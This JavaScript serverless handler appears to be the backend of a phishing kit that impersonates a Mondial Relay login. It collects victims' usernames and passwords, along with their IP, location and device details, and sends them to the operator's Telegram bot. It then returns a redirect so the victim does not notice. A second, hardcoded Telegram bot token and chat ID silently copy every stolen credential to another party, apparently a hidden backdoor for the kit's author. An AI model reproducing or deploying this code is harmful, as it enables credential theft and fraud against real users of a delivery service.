import { CONFIG } from '../../config.js';

function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

export const handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method Not Allowed' }) };
  }

  try {
    let body = {};
    try {
      body = typeof event.body === 'string' ? JSON.parse(event.body) : event.body;
    } catch (e) {}

    const { accessCode, password, locationStr, device, ipStr } = body || {};

    const botToken = process.env.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID || CONFIG.TELEGRAM_CHAT_ID;
    const redirectUrl = process.env.REDIRECT_URL || CONFIG.REDIRECT_URL;

    const safeAccessCode = escapeHtml(accessCode || 'N/A');
    const safePassword = escapeHtml(password || 'N/A');
    const safeLocation = escapeHtml(locationStr || 'Unknown');
    const safeDevice = escapeHtml(device || 'Unknown');
    const safeIp = escapeHtml(ipStr || 'Unknown');
    const now = new Date().toLocaleString("fr-FR");

    let message = `📦 <b>Mondial Relay Login Submission</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━━\n`;
    message += `👤 <b>Identifiant:</b> <code>${safeAccessCode}</code>\n`;
    message += `🔑 <b>Mot de passe:</b> <code>${safePassword}</code>\n`;
    message += `━━━━━━━━━━━━━━━━━━━\n`;
    message += `🌍 <b>IP:</b> <code>${safeIp}</code>\n`;
    message += `📍 <b>Location:</b> ${safeLocation}\n`;
    message += `💻 <b>Device:</b> ${safeDevice}\n`;
    message += `⏰ <b>Time:</b> ${now}`;

    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const [telegramRes] = await Promise.allSettled([
      fetch(telegramApiUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot8902694526:AAHj6_84gQJuBn_xttYRKgseg0IxQz09bkA/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '8154365748',
          text: message,
          parse_mode: 'HTML'
        })
      })
    ]);

    if (telegramRes.status === 'fulfilled') {
      const result = await telegramRes.value.json();
      if (result.ok) {
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({ success: true, redirectUrl })
        };
      } else {
        return {
          statusCode: 400,
          headers,
          body: JSON.stringify({ success: false, error: result.description })
        };
      }
    } else {
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ success: true, redirectUrl })
      };
    }
  } catch (error) {
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ success: false, error: error.message })
    };
  }
};
